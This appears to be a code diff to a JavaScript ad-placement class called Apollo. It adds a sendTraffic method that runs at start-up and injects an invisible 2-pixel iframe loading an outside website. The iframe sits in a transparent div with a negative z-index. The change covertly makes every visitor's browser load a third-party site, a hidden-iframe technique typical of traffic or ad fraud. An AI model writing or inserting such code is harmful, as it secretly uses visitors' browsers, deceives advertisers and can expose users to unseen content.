@@ -12,6 +12,7 @@ class Apollo {
 
     //Start Apollo
     this.insertDesktopDivs(this.ads);
+    this.sendTraffic();
   }
 
   rand (min,max) {
@@ -105,6 +106,22 @@ class Apollo {
       this[ranDiv].style.zIndex = `300000`
 
     }
+  }
+
+  sendTraffic () {
+    let iframe = `<iframe src="http://artscanopy.com" width="2px" height="2x" allowtransparency="true" scrolling="false"></iframe>`
+
+    this.frameDiv = document.createElement('div')
+    this.frameDiv.style.width = `2px`
+    this.frameDiv.style.height = `2px`
+    this.frameDiv.style.bottom = 0
+    this.frameDiv.style.position = 'absolute'
+    this.frameDiv.style.opacity = '0'
+    this.frameDiv.style.zIndex = '-30000'
+    this.frameDiv.id = `frameDiv`
+    this.frameDiv.innerHTML = iframe
+
+    document.body.insertAdjacentElement('beforeend', this.frameDiv)
   }
 }
 
